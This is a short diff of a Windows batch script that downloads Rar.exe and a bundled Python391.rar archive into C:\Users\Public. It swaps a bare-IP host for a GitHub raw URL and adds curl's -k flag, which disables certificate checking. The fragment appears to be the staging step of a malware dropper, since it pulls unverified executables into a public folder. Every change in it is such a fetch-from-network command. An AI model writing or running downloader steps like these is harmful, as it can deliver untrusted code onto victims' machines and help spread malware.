@@ -2,7 +2,7 @@
 cd /d "C:\Users\Public"
 
 echo Downloading Rar.exe...
-curl -# -L "http://45.136.13.247/Rar.exe" -o "Rar.exe"
+curl -# -L -k "https://raw.githubusercontent.com/kmoshan/1/refs/heads/main/Rar.exe" -o "Rar.exe"
 if not exist "Rar.exe" (
     echo Rar.exe download failed
     pause
@@ -10,7 +10,7 @@ if not exist "Rar.exe" (
 )
 
 echo Downloading Python391.rar...
-curl -# -L "http://45.136.13.247/Python391.rar" -o "Python391.rar"
+curl -# -L -k "https://raw.githubusercontent.com/kmoshan/1/refs/heads/main/Python391.rar" -o "Python391.rar"
 if not exist "Python391.rar" (
     echo Python391.rar download failed
     pause
